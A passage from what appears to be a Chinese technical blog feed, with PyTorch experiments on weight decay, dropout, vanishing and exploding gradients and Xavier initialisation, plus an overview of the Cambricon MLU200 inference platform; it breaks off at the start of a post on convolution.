        # loss = loss_fn(pred, y) + lambda_val*l2_penalty(next(param_iter), next(param_iter))
        # next(model.parameters())
        loss = loss_fn(pred, y) + lambda_val*l2_penalty(next(model.parameters()))

        # Backpropagation
        optimizer.zero_grad()
        loss.backward()
        optimizer.step()

        train_loss_sum += loss.item()


        if batch % 2 == 0:
            loss, current = loss.item(), batch * len(X)
            print(f"loss: &#123;loss:>7f&#125;  [&#123;current:>5d&#125;/&#123;size:>5d&#125;]")
    
    print(f"Train Error: \n Avg loss: &#123;train_loss_sum/num_batches:>8f&#125; \n")

    return train_loss_sum/num_batches


def test(dataloader, model, loss_fn):
    num_batches = test_examples / batch_size
    test_loss = 0
    with torch.no_grad():
        for X, y in dataloader:
            # move X, y to gpu
            if torch.cuda.is_available():
                X = X.to('cuda', dtype=torch.float32)
                y = y.to('cuda', dtype=torch.float32)
            pred = model(X)
            test_loss += loss_fn(pred, y).item()

    test_loss /= num_batches
    print(f"Test Error: \n Avg loss: &#123;test_loss:>8f&#125; \n")

    return test_loss
    
if __name__ == '__main__':
    device = 'cuda' if torch.cuda.is_available() else 'cpu'
    print('Using &#123;&#125; device'.format(device))
    
    num_inputs = 200

    true_w = np.ones(num_inputs) * 0.01

    true_b = 0.78  

    test_examples = 100
    train_examples = 20
    
    num_examples = test_examples + train_examples

    f1, labels = synthetic_data(true_w, true_b, num_examples)
    print(f1.shape)
    print(labels.shape)


    l1_loss_fn = torch.nn.MSELoss()
    
    learning_rate = 0.01

    model = TestNet(num_inputs)

    optimizer = torch.optim.SGD(model.parameters(), lr=learning_rate, weight_decay=0)

    model = model.to(device)
    print(model)

    epochs = 100

    model.train()


    batch_size = 5

    train_data = (torch.tensor(f1[:train_examples,]), torch.tensor(labels[:train_examples,]))
    test_data = (torch.tensor(f1[train_examples:,]), torch.tensor(labels[train_examples:,]))

    train_dataloader = load_array(train_data ,batch_size, True)
    test_dataloader = load_array(test_data ,batch_size, True)
    # verify dataloader
    # for x,y in train_dataloader:
    #     print(x.shape)
    #     print(y.shape)
    #     print(torch.matmul( x , torch.tensor(true_w)) + torch.tensor(true_b))
    #     print(y)
    #     break
    param_iter = model.parameters()
    print('W = ')
    print(next(param_iter).shape)
    print('b = ')
    print(next(param_iter).dtype)

    model.train()
    for t in range(epochs):
        print(f"Epoch &#123;t+1&#125;\n-------------------------------")
        train_l = train(train_dataloader, model, l1_loss_fn, optimizer, lambda_val=3)
        test_l = test(test_dataloader, model, l1_loss_fn)
        ydata0.append(train_l*10)
        ydata1.append(test_l*10)
        xdata0.append(t)
        xdata1.append(t)
        # print(test_l)
        # print(train_l)
    print("Done!")

    init_and_show()

    param_iter = model.parameters()
    # print('W = ')
    # print(next(param_iter).shape)
    # print('b = ')
    # print(next(param_iter).shape)
    print('w的L2范数是：', np.linalg.norm(next(param_iter).to('cpu').detach().numpy()))
    print('b的L2范数是：', np.linalg.norm(next(param_iter).to('cpu').detach().numpy()))


过拟合
  这个时候是未添加l2到损失函数的。
  train函数如下：
train_l = train(train_dataloader, model, l1_loss_fn, optimizer, lambda_val=0)
  训练结果如下，存在严重的过拟合现象：

    
        
    
    


权重衰减
  我们先对w进行权重衰减。
  train函数如下：
train_l = train(train_dataloader, model, l1_loss_fn, optimizer, lambda_val=3)
  训练结果如下，过拟合现象出现了缓解：

    
        
    
  




权重衰减适应性
  我们对w和b同时进行权重衰减。train函数如下：
optimizer = torch.optim.SGD(model.parameters(), lr=learning_rate, weight_decay=3)
train_l = train(train_dataloader, model, l1_loss_fn, optimizer, lambda_val=0)
  训练结果如下，我们发现，过拟合现象并没有缓解：

    
        
    
  
  就是上图引起了我的兴趣，因为我们引入了权重衰减，但是其并没有缓解，这是为什么呢？还记得我们权重衰减的目标是将权重的范数逼近于0吗？但是我们b是一个不接近于0的常量，因此过拟合并没有缓解。
  我们对w和b同时进行权重衰减。我们修改，train函数如下，主要将true_b调整为接近于0，这样我们同时对w，b进行衰减就是合理的：
true_b = 0.01
optimizer = torch.optim.SGD(model.parameters(), lr=learning_rate, weight_decay=3)
train_l = train(train_dataloader, model, l1_loss_fn, optimizer, lambda_val=0)

    
        
    
  
&emsp;&emsp;我们通过上面两张图的结果，说明的权重衰减的适应性以及目标。注意我们一般情况下不会对b进行权重衰减，因为其是常量。我看学习资料上并没有介绍为什么偏置不能够进行权重衰减，这里我做的这个实验可以当做一个原因吧。
  pytorch的优化器里面的weight_decay参数是对所有参数进行衰减，要注意这个问题，若想单独对w进行衰减，请分别对不同的参数设定不同的优化器。这一块网上资料很多，我就不多说了。




Dropout

  首先，Dropout是在([Srivastava et al., 2014] Srivastava, N., Hinton, G., Krizhevsky, A., Sutskever, I., &amp; Salakhutdinov, R. (2014). Dropout: a simple way to prevent neural networks from overfitting. The Journal of Machine Learning Research, 15(1), 1929‒1958.)一文中引出的。
  对于Dropout，我们可以从资料里面的代码里面看到其相关的原理：
def dropout_layer(X, dropout):
    assert 0 &lt;= dropout &lt;= 1
    # 在本情况中，所有元素都被丢弃。
    if dropout == 1:
        return np.zeros_like(X)
    # 在本情况中，所有元素都被保留。
    if dropout == 0:
        return X
    mask = np.random.uniform(0, 1, X.shape) > dropout
    print(mask.astype(np.float32))
    return mask.astype(np.float32) * X / (1.0 - dropout)
  其工作如下：在训练的时候，按照传入的概率p丢弃一部分输出，并除以1-p。在测试的时候，跳过dropout_layer。其能正常工作的关键就是‘玄学’，打破了前一层和后一层的特定关联，破坏了两层之间的特定关联，缓解了过拟合。这个部分，建议多体会，虽然随机置0了部分值，但是输出规模是的趋势是一定的。
  虽然我们从这里说明了其生效的原理，但是我们并没有解释为啥这样写是合理的？注意为何我们要在训练的时候除以1-p呢？
  其实我们可以看到，Dropout是针对输出的，当我们只要保证训练和测试的输出规模保持一致，就可以保证测试和训练的结果是一致的。这里的规模保持一致，其实就是他们两个的期望保持一致。定义输入为X, dropout概率为p(以p的概率丢弃)，那么$E(x) = ((1-p)X + p*0)/(1-p) = X$。因此，我们也可以得到结论，我们在训练时dropout生效，测试时直接跳过dropout层，这两种情况下的X的规模是一致的，不影响我们的网络结果。
  此外，我们从这里可以看到，dropout是以概率来丢弃相关的输入X，那么我们必须在X规模足够大的情况下使用dropout，才能保证剩下的X能够学到足够的特征。因此，我们平常一般把dropout放在全连接层后。
  下面，我们自己构造一个分类网络，使用FashionMNIST数据集（60000训练，10000测试）。然后在全连接层后面接dropout层，默认是不丢弃任何项，dropout的p=0，代码如下：
import torch
from torch import nn
import numpy as np
import matplotlib.pyplot as plt
from torch.utils import data
from matplotlib.pyplot import MultipleLocator
from torchvision import datasets, transforms
from torch.utils.data import DataLoader

fig, ax = plt.subplots()
xdata, ydata = [[], [], [], []], [[], [], [], []]
line0, = ax.plot([], [], 'r-', label='TrainError')
line1, = ax.plot([], [], 'b-', label='TrainAcc')
line2, = ax.plot([], [], 'g-', label='TestError')
line3, = ax.plot([], [], 'y-', label='TestAcc')

def init_and_show():
    ax.set_xlabel('epoch')
    ax.set_ylabel('loss/acc')
    ax.set_title('Train/Test Loss/Acc')
    ax.set_xlim(0, epochs)
    ax.set_ylim(0, 1)
    # ax.set_yscale('log')
    # y_locator = MultipleLocator(0.1)
    # ax.yaxis.set_major_locator(y_locator)
    ax.legend([line0, line1, line2, line3], ('TrainError', 'TrainAcc', "TestError", "TestAcc"))
    
    # ax.legend([line1], ('TestError', ))
    line0.set_data(xdata[0], ydata[0])
    line1.set_data(xdata[1], ydata[1])
    line2.set_data(xdata[2], ydata[2])
    line3.set_data(xdata[3], ydata[3])

    plt.show()

def dropout_layer(X, dropout):
    assert 0 &lt;= dropout &lt;= 1
    # 在本情况中，所有元素都被丢弃。
    if dropout == 1:
        return np.zeros_like(X)
    # 在本情况中，所有元素都被保留。
    if dropout == 0:
        return X
    mask = np.random.uniform(0, 1, X.shape) > dropout
    print(mask.astype(np.float32))
    return mask.astype(np.float32) * X / (1.0 - dropout)


class TestNet(nn.Module):
    def __init__(self, dropout_p_arr = [0, 0]):
        super(TestNet, self).__init__()
        self.test_net = nn.Sequential(

            torch.nn.Linear(1*28*28, 512),
            torch.nn.ReLU(),
            torch.nn.Dropout(dropout_p_arr[0]),

            torch.nn.Linear(512, 512),
            torch.nn.ReLU(),
            torch.nn.Dropout(dropout_p_arr[1]),
            
            torch.nn.Linear(512, 10),

        )   

    def forward(self, x):
        # print(x.dtype)
        # 
        return self.test_net(x)

def LoadFashionMNISTByTorchApi():
    resize=28
    trans = [transforms.ToTensor()]
    if resize:
        trans.insert(0, transforms.Resize(resize))
    trans = transforms.Compose(trans)
    # 60000*28*28
    training_data = datasets.FashionMNIST(
        root="..\data",
        train=True,
        download=True,
        transform=trans
    )

    # 10000*28*28
    test_data = datasets.FashionMNIST(
        root="..\data",
        train=False,
        download=True,
        transform=trans
    )

    # labels_map = &#123;
    #     0: "T-Shirt",
    #     1: "Trouser",
    #     2: "Pullover",
    #     3: "Dress",
    #     4: "Coat",
    #     5: "Sandal",
    #     6: "Shirt",
    #     7: "Sneaker",
    #     8: "Bag",
    #     9: "Ankle Boot",
    # &#125;
    # figure = plt.figure(figsize=(8, 8))
    # cols, rows = 3, 3
    # for i in range(1, cols * rows + 1):
    #     sample_idx = torch.randint(len(training_data), size=(1,)).item()
    #     img, label = training_data[sample_idx]
    #     figure.add_subplot(rows, cols, i)
    #     plt.title(labels_map[label])
    #     plt.axis("off")
    #     plt.imshow(img.squeeze(), cmap="gray")
    # plt.show()
    return training_data, test_data
    
def train(dataloader, model, loss_fn, optimizer):
    num_batches = len(dataloader)
    size = num_batches*batch_size
    train_loss_sum = 0
    train_acc_sum = 0
    for batch, (X, y) in enumerate(dataloader):
        # move X, y to gpu
        if torch.cuda.is_available():
            X = X.to('cuda', dtype=torch.float32)
            y = y.to('cuda')
        # Compute prediction and loss
        pred = model(X.reshape(batch_size,  -1))
        # print(pred.shape)
        # print(y.shape)
        
        loss = loss_fn(pred, y)

        # Backpropagation
        optimizer.zero_grad()
        loss.backward()
        optimizer.step()

        train_loss_sum += loss.item()

        # cal train acc
        pred = model(X.reshape(batch_size,  -1))
        train_acc_sum += (pred.argmax(1) == y).type(torch.float).sum().item()/batch_size

        if batch % 100 == 0:
            loss, current = loss.item(), batch * len(X)
            print(f"loss: &#123;loss:>7f&#125;  [&#123;current:>5d&#125;/&#123;size:>5d&#125;]")
    
    print(f"Train Error: \n Avg loss: &#123;train_loss_sum/num_batches:>8f&#125; \n")
    print(f"Train Acc  : \n Avg acc : &#123;train_acc_sum/num_batches:>8f&#125; \n")

    return train_loss_sum/num_batches, train_acc_sum/num_batches


def test(dataloader, model, loss_fn):
    num_batches = len(dataloader)
    test_loss = 0
    test_acc = 0
    with torch.no_grad():
        for X, y in dataloader:
            # move X, y to gpu
            if torch.cuda.is_available():
                X = X.to('cuda', dtype=torch.float32)
                y = y.to('cuda')
            pred = model(X.reshape(batch_size, -1))
            test_loss += loss_fn(pred, y).item()
            test_acc += (pred.argmax(1) == y).type(torch.float).sum().item()/batch_size
    test_loss /= num_batches
    test_acc /= num_batches
    print(f"Test Error: \n Avg loss: &#123;test_loss:>8f&#125; \n")
    print(f"Test Acc  : \n Avg loss: &#123;test_acc:>8f&#125;  \n")
    return test_loss, test_acc
    
if __name__ == '__main__':
    device = 'cuda' if torch.cuda.is_available() else 'cpu'
    print('Using &#123;&#125; device'.format(device))
    
    loss_fn = torch.nn.CrossEntropyLoss()
    
    learning_rate = 0.5
    # [0.4, 0.7]
    model = TestNet()

    optimizer = torch.optim.SGD(model.parameters(), lr=learning_rate, weight_decay=0)

    model = model.to(device)
    print(model)

    epochs = 10

    model.train()


    batch_size = 200

    train_data, test_data = LoadFashionMNISTByTorchApi()
    

    train_dataloader = DataLoader(train_data, batch_size, shuffle=True)
    test_dataloader = DataLoader(test_data, batch_size, shuffle=True)
    print(len(train_dataloader))
    print(len(test_dataloader))
    # #verify dataloader
    # for x,y in train_dataloader:
    #     print(x.shape)
    #     print(y.shape)
    #     break

    param_iter = model.parameters()
    print(next(param_iter).shape)
    
    
    for t in range(epochs):
        print(f"Epoch &#123;t+1&#125;\n-------------------------------")
        model.train()
        train_l, train_acc = train(train_dataloader, model, loss_fn, optimizer)
        model.eval()
        test_l, test_acc = test(test_dataloader, model, loss_fn)

        xdata[0].append(t)
        xdata[1].append(t)
        xdata[2].append(t)
        xdata[3].append(t)

        ydata[0].append(train_l)
        ydata[1].append(train_acc)
        ydata[2].append(test_l)
        ydata[3].append(test_acc)
        
    print("Done!")

    init_and_show()


正常过拟合
  直接用上面代码进行训练后得到结果如下：

    
        
    
    
&emsp;&emsp;我们可以发现，测试准确率比训练准确率低，满足过拟合的现象。
启用dropout
  修改训练代码：
    # [0.4, 0.7]
model = TestNet([0.4, 0.7])
  训练结果如图：

    
        
    
    
  我们可以很直观的发现，训练和测试的acc和error出现了重合的情况，至少证明了过拟合现象出现了缓解。




后记

  对于权重衰减，一般就是要将参数的L2范数尽量学习来趋近于0，这样模型复杂度变小。此外权重衰减还可以将参数限制到一个稳定的范围，避免出现了较大的波动。对于稳定的学习过程是有帮助的。
  对于Dropout来说，就是打破一些输出比较大的相关层的关联性，注意，其是针对输出，并不是针对权重。有些时候，相关层的关联性就是我们要学的，但是有些时候，这种关联性可能就是不需要的，所以通过这种‘玄学’的方式，在训练的时候，以概率性来丢弃某些输出，打破这项输出和下一层的关联性。这对于大的网络来说，是有意义的。
参考文献


https://github.com/d2l-ai/d2l-zh/releases (V1.0.0)


https://github.com/d2l-ai/d2l-zh/releases (V2.0.0 alpha1)


Srivastava, N., Hinton, G., Krizhevsky, A., Sutskever, I., &amp; Salakhutdinov, R. (2014). Dropout: a simple way to prevent neural networks from overfitting. The Journal of Machine Learning Research, 15(1), 1929‒1958.







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>DL</category>
        <category>计算机视觉</category>
      </categories>
      <tags>
        <tag>Dropout</tag>
      </tags>
  </entry>
  <entry>
    <title>寒武纪加速平台(MLU200系列) 摸鱼指南（一）--- 基本概念及相关介绍</title>
    <url>/2021/11/07/blog_idx_111/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  从2019年开始，我们公司的智能分析平台核心架构就开始逐渐的转向了RK3399PRO，这是我们公司的第三代智能分析平台，前面两代分别是TK1和TX2，但是因为众所周知的原因，这一代分析平台选择了国内的一些替代商。经过了2019年和2020年的实际部署和使用，对于第三代智能分析平台来说，有一个硬性缺陷就是NPU算力过低（INT8 3T），导致了某些算法达不到实时帧率，其其他的性能还是不错的，如CPU计算力、编解码等等。正是由于这个算力的缺陷，所以在2020年，我们调研了市场上的其他算力平台的情况，经过某些渠道，我们和寒武纪联系上了。寒武纪给我们介绍了他们的MLU200系列智能分析平台的情况，并提供了相应测试板卡，经过相应的测试后，我们技术人员及公司领导对其比较认可，因此决定第四代平台会加入寒武纪的推理模块，最终形成了以RK作为主控，寒武纪作为推理模块的形式，为什么这样搭建，后文有所提及。由于现在市场上已经出现了类似我们公司的第四代智能分析平台的产品，于是相关介绍可以进行解密脱敏发布。本系列文章就是对这个寒武纪平台做一些简单的介绍及总结。
  若文中引用部分存在侵权，请及时联系我删除。




寒武纪加速平台简介

  寒武纪加速平台是有两个部分构成，一个部分是算力硬件，一部分是配套的软件。


寒武纪硬件部分
  首先，这里介绍的是寒武纪的MLU200系列，在本文发布时，其实其MLU200系列的升级版，MLU300系列也在寒武纪内部及其相关的合作伙伴正在测试。
  对于MLU200系列来说，我们从其官网可以看到，大概存在3个系列，一个是边缘端推理MLU220（只支持推理），一个是服务器端推理MLU270（只支持推理），一个是MLU290（支持训练和推理）。可以从其官网（https://www.cambricon.com/） 查看更加详细的介绍。
  对于MLU220来说，这里介绍两个比较重要的参数，具备两种形态，一种是INT8 8T算力+8.25W功耗，一种是INT8 16T算力+16.5W功耗。MLU220边缘端模块正是我们公司第四代智能分析平台的核心部件之一，但是由于其CPU计算能力较弱，导致不能够进行大量的业务逻辑运算，这也是某些场景可能需要其他主控的原因。
  对于MLU270来说，除了部署服务端的智能分析算法外，其对我们来说最重要的功能是作为模型移植的硬件。我们的智能分析算法想要比较好的工作在MLU220边缘端，就必须要经过MLU270上进行模型移植，这也是后续文章的重点之一。
  对于MLU290来说，我们公司没有使用，但是看其介绍，一般来说都是应用在各云厂商、机房和服务中心等，其的最大亮点是支持模型训练。


寒武纪软件部分
  寒武纪软件部分我大概可以分为3类，一个是驱动，一个是运行时库，一个是其相关的算法框架等。如其官网的结构图：

    
        
    
    
  从上图来看，在相关的算法框架那块里面，还包含了两个我们实际用到了，但是其图中没有给出的介绍。图中的相关算法框架部分都是用于算法训练、推理、移植使用的。其实在推理部分来看（运行时之上），还应该包含寒武纪出的两个开源工程：EasyDK以及CNStream。
  EasyDK是其基于其运行时库封装的一些常用和简易接口，对我们来说，可能最常用的就是关于离线模型推理部分。相关介绍请参见其官网： https://github.com/Cambricon/easydk
  CNStream是其基于EasyDK封装的一套应用层库，我觉得其和deepstream和MediaPipe有异曲同工之妙。相关介绍请参见其官网：https://github.com/Cambricon/CNStream
  其实从这里我们可以看出，一般来说，我们自己的推理端的程序和服务，有三种形态：


基于CNStream进行开发，其封装的还不错，并行处理的还行，但是可能就是不能够很好的和自己以前的程序框架移植和融合。


基于EasyDK进行开发，简化调用及开发流程，但是会有些坑需要去阅读EasyDk源码和运行时相关的SDK文档。


基于其运行时相关的SDK文档进行开发，需要花大量的时间进行学习，适合长期工作在此平台的相关人员。


  对于我们公司来说，我们现在基本工作在EasyDK和其运行时之间，基于这两个进行混合编程，最终的理想状态是直接基于其运行时库进行开发。




寒武纪加速平台使用简介

  在前言部分已经介绍过了，我们公司的第四代智能分析平台的核心构成部分是MLU220。因此，我们公司做的事情其实将已经训练好的Caffe、Pytorch等框架的模型移植到寒武纪平台。寒武纪平台根据其定位做了云端和终端的商业定位。其官网介绍图如下：

    
        
    
    
  下面我对我司使用的基本流程做一个简介。


部署流程简介
  寒武纪平台的部署流程有一条主线是将一个原始模型转为一个离线模型。基本流程如下：


得到算法的原始模型，如caffe/pytorch/tensorflow等框架的模型。


配置对应框架模型的模型转换环境，有两种一种是手动配置，一种是docker。


使用对应的框架模型转换环境，进行模型量化、转换得到离线模型。


开发支持离线模型的程序应用，调用离线模型进行推理并做其他处理。


  关于我司使用的基本流程，后续文章将会有一个实例来详细展开说明，这里就不多介绍了。




后记

  本文主要介绍了寒武纪加速平台的一些概念。更多的详情，请查看寒武纪官网相关的介绍。
  其实看到国内的各个软硬一体厂商发展的还是不错的，希望他们可以取得更加长足的发展，希望他们为国产争光。
参考文献


https://www.cambricon.com/


其他相关保密资料。







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>嵌入式</category>
        <category>DL</category>
        <category>常识</category>
      </categories>
      <tags>
        <tag>嵌入式</tag>
        <tag>边缘端</tag>
        <tag>人工智能</tag>
      </tags>
  </entry>
  <entry>
    <title>DL基础补全计划(五)---数值稳定性及参数初始化（梯度消失、梯度爆炸）</title>
    <url>/2021/08/08/blog_idx_109/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明


Windows 10


VSCode


Python 3.8.10


Pytorch 1.8.1


Cuda 10.2


前言

  如果有计算机背景的相关童鞋，都应该知道数值计算中的上溢和下溢的问题。关于计算机中的数值表示，在我的《数与计算机 （编码、原码、反码、补码、移码、IEEE 754、定点数、浮点数）》 (https://blog.csdn.net/u011728480/article/details/100277582) 一文中有比较好的介绍。计算机中的数值表示，相对于实数数轴来说是离散且有限的，意思就是计算机中的能表示的数有最大值和最小值以及最小单位，特别是浮点数表示，有兴趣的可以看看上文。
  其实很好理解，深度学习里面具有大量的乘法加法，一不小心你就会遇见上溢和下溢的问题，因此我们一不小心就会遇见NAN和INF的问题（NAN和INF详见上文提到的文章）。此外，由于一些特殊的情况，可能会导致我们的参数的偏导数接近于0，让我们的模型收敛的非常的慢。因此我们可能需要从模型的初始化以及相关的模型构造方面来好好的讨论一下我们在训练过程中可能出现的问题。
  一般来说，我们训练的时候都非常的关注我们的损失函数，如果损失函数值异常，会导致相关的偏导数出现接近于0或者接近于无限大，那么就会直接导致模型训练及其困难。此外，我们的权重参数也会参与网络计算，按照上述的描述，权重参数的初始值也可能导致损失函数的值异常。因此大佬们也引入了另外一种常见的初始化方式Xavier，比较具有普适性。下面我们简单的验证一下我们训练过程中出现梯度接近于0和接近于无限大的情况，这里也就是说的梯度消失和梯度爆炸问题。同时也简单说明参数初始化相关的问题。




梯度消失（gradient vanishing）

  在深度学习中有一个激活层叫做Sigmoid层，其定义如下是:$Sigmoid(x)=1/(1+\exp(-x))$,如果我们的模型里面接入了这种激活函数，很容易构造出梯度消失的情况，下面我们看一下其导数和函数值相对于X的相关关系。
  代码如下：
import torch
import numpy as np
import matplotlib.pyplot as plt


fig, ax = plt.subplots()
xdata, ydata = [[], []], [[], []]
line0, = ax.plot([], [], 'r-', label='sigmoid')
line1, = ax.plot([], [], 'b-', label='gradient-sigmoid')


def init_and_show(xlim_min, xlim_max, ylim_min, ylim_max):
    ax.set_xlabel('x')
    ax.set_ylabel('sigmoid(x)')
    ax.set_title('sigmoid/gradient-sigmoid')
    ax.set_xlim(xlim_min, xlim_max)
    ax.set_ylim(ylim_min, ylim_max)
    ax.legend([line0, line1], ('sigmoid', 'gradient-sigmoid'))
    
    line0.set_data(xdata[0], ydata[0])
    line1.set_data(xdata[1], ydata[1])

    plt.show()

def sigmoid_test():
    x = np.arange(-10.0, 10.0, 0.1)
    
    x = torch.tensor(x, dtype=torch.float, requires_grad=True)

    sig_fun = torch.nn.Sigmoid()

    y = sig_fun(x)

    y.backward(torch.ones_like(y))

    xdata[0] = x.detach().numpy()
    xdata[1] = x.detach().numpy()
    ydata[0] = y.detach().numpy()
    ydata[1] = x.grad.detach().numpy()

    init_and_show(-10.0, 10.0, 0, 1)

def multi_mat_dot():
    M = np.random.normal(size=(4, 4))
    print('⼀个矩阵\n', M)
    for i in range(10000):
        M = np.dot(M, np.random.normal(size=(4, 4)))
    print('乘以100个矩阵后\n', M)
            
if __name__ == '__main__':
    sigmoid_test()
  结果图如下

    
        
    
    
  我们可以从图中看到，当x小于-5和大于+5的时候，其导数的值接近于0，导致bp的时候，参数更新小，模型收敛的特别的慢。




梯度爆炸（gradient exploding）

  现在我们假设我们有一个模型，其有N个线性层构成，定义输入为X，标签为Y，模型为 $M(X) = X*W_1 … W_{n-2}*W_{n-1}W_n$，损失函数为$L(X) = M(X) - Y = XW_1 … W_{n-2}*W_{n-1}W_n - Y$，求W1关于损失函数的偏导数$\frac{dL(X)}{dW_1} = XW_2 … W_{n-2}*W_{n-1}*W_n$。从这里我们可以看到W2到Wn与输入的X的乘积构成了W1的偏导数。
  下面我们简单的构造一个矩阵，然后让他计算100次乘法。代码如下：
import torch
import numpy as np
import matplotlib.pyplot as plt


fig, ax = plt.subplots()
xdata, ydata = [[], []], [[], []]
line0, = ax.plot([], [], 'r-', label='sigmoid')
line1, = ax.plot([], [], 'b-', label='gradient-sigmoid')


def init_and_show(xlim_min, xlim_max, ylim_min, ylim_max):
    ax.set_xlabel('x')
    ax.set_ylabel('sigmoid(x)')
    ax.set_title('sigmoid/gradient-sigmoid')
    ax.set_xlim(xlim_min, xlim_max)
    ax.set_ylim(ylim_min, ylim_max)
    ax.legend([line0, line1], ('sigmoid', 'gradient-sigmoid'))
    
    line0.set_data(xdata[0], ydata[0])
    line1.set_data(xdata[1], ydata[1])

    plt.show()

def sigmoid_test():
    x = np.arange(-10.0, 10.0, 0.1)
    
    x = torch.tensor(x, dtype=torch.float, requires_grad=True)

    sig_fun = torch.nn.Sigmoid()

    y = sig_fun(x)

    y.backward(torch.ones_like(y))

    xdata[0] = x.detach().numpy()
    xdata[1] = x.detach().numpy()
    ydata[0] = y.detach().numpy()
    ydata[1] = x.grad.detach().numpy()

    init_and_show(-10.0, 10.0, 0, 1)

def multi_mat_dot():
    M = np.random.normal(size=(4, 4))
    print('⼀个矩阵\n', M)
    for i in range(100):
        M = np.dot(M, np.random.normal(size=(4, 4)))
    print('乘以100个矩阵后\n', M)
            
if __name__ == '__main__':
    multi_mat_dot()

  他计算100次乘法后结果如下：

    
        
    
    
  我们可以看到，经过100次乘法后，其值已经非常大（小）了指数都是到了25了。这个时候算出来的损失非常大的，这个时候梯度也非常大，很容易导致训练异常。




参数初始化之Xavier

  文首我们提到，我们之前的参数初始化都是基于期望为0，方差为一个指定值初始化的，这里面的指定值是随个人定义的，这个可能会给我们的训练过程带来困扰。
  但是我们可以从以下的角度来看待这个事情，我们的权重参数W是一个期望为0，方差为$\delta2$的特定分布。我们的输入特征X是一个期望为0，方差为$\lambda2$的特定分布（注意这里不仅仅是正态分布）。我们假设我们的模型是线性模型，那么其输出为：$O_i = \sum\limits_{j=1}^{n}W_{ij}X_{j}$，$O_i$是代表第i层的输出。这个时候，我们求出$O_i$的期望是:$E(O_i) = \sum\limits_{j=1}^{n}E(W_{ij}X_{j}) = \sum\limits_{j=1}^{n}E(W_{ij})E(X_{j}) = 0$，其方差为：$Variance(O_i) = E(O_i^2) - (E(O_i))^2 = \sum\limits_{j=1}{n}E(W_{ij}2X_{j}^2) - 0 = \sum\limits_{j=1}{n}E(W_{ij}2)E(X_{j}^2) = n*\delta2*\lambda2$。我们现在假设如果要$O_i$的方差等于X的方差，那么$n*\delta^2 = 1$才能够满足要求。现在我们考虑BP的时候，也需要$n_{out}\delta^2 = 1$才能够保证方差不会变，至少从数值稳定性来说，我们应该保证方差尽量稳定，不应该放大。我们同时考虑n和$n_{out}$，那么我们可以认为当$1/2(n+n_{out})*\delta^2 = 1$时，我们保证了输出O的方差在约定范围内，尽量保证了其数值的稳定性，这就是Xavier方法的核心内容。
  初始化方法有很多，但是Xavier方法有较大的普适性。对于某些模型，特定的初始化方法有奇效。




后记

  到本文结束，其实我们可以训练一些简单的模型了，但是本文所介绍的3个概念会一直伴随着我们以后的学习过程，如果训练出现了INF，NAN这些特殊的值，基本我们就需要往这方面去想和解决问题。
参考文献


https://github.com/d2l-ai/d2l-zh/releases (V1.0.0)


https://github.com/d2l-ai/d2l-zh/releases (V2.0.0 alpha1)


https://blog.csdn.net/u011728480/article/details/100277582 《数与计算机 （编码、原码、反码、补码、移码、IEEE 754、定点数、浮点数）》







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>DL</category>
        <category>计算机视觉</category>
      </categories>
      <tags>
        <tag>梯度</tag>
      </tags>
  </entry>
  <entry>
    <title>DL基础补全计划(六)---卷积和池化</title>
    <url>/2021/08/15/blog_idx_110/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明


Windows 10


VSCode


Python 3.8.10


Pytorch 1.8.1


Cuda 10.2


前言

  本文是此基础补全计划的最终篇，因为从我的角度来说，如果前面这些基础知识都能够了解及理解，再加上本文的这篇基础知识，那么我们算是小半只脚踏入了大门。从这个时候，其实我们就已经可以做图像上的基本的分类任务了。除了分类任务，我们还有两类重要的图像任务是目标检测和图像分割，这两项任务都和分类任务有一定的关联，可以说，分类可以说是这两类的基础。
  卷积神经网络是一个专门为处理图像数据的网络。下面我们简单的来看看卷积、池化的含义和怎么计算的，然后我们通过一个LeNet5的经典网络，训练一个分类模型。




卷积

  卷积是一种运算，类似加减乘除。卷积是一种运算，类似加减乘除。卷积是一种运算，类似加减乘除。重要的事情说三次。
  在数学上的定义是:连续n的情况$(fg)(x) = \int f(n)g(x-n)dn$， 离散n的情况$(fg)(x) = \sum\limits_{n} f(n)g(x-n)$。从这里我们可以看到，卷积就是测量函数f和函数g的翻转且平移x后的重叠。其二维离散a,b的表达是$(f*g)(x1,x2) = \sum\limits_{a}\sum\limits_{b} f(a, b)g(x1-a, x2-b)$
  卷积是一种运算，类似加减乘除。卷积是一种运算，类似加减乘除。卷积是一种运算，类似加减乘除。重要的事情再说三次。
  我们再次想一想，在之前的文章中，我们普遍都建立了一种想法是，把输入数据拉成一条直线输入的，这就意味着我们在之前的任务里面只建立了相邻输入数据之间的左右关联。但是我们可以想一想，是不是所有的数据只建立左右关联就行了呢？显而易见的，并不是这样的，比如我们图片，可能上下左右4个像素加起来才是一个猫，如果我们只关联了左右，那么它可能是狗或者猫。那么我们应该通过什么样的方式来对图片像素的这种二维关联性进行描述或者计算呢？这种方法就是卷积运算。
  卷积网上有许许多多的介绍，大家都做了许多详细的解答，包含信号分析、复利、概率以及图像滤波等等方面的解释。我个人认为我们可以抛开这些方面，从数据之间的关联性来看这个问题可能是最好理解的，因为我们之前只关注了数据之间左右关联，我们应该同时关注上下左右的关联才对，我们要从空间的角度来考虑数据之间的关联性。而卷积作为一种数学运算，他恰好是计算了数据的上下左右关联性，因此卷积这种数学运算很适合拿来代替之前的一条线的线性运算。
  下面我们来看一下一个基本的卷积计算过程是什么样子的。


图像边缘检测实例
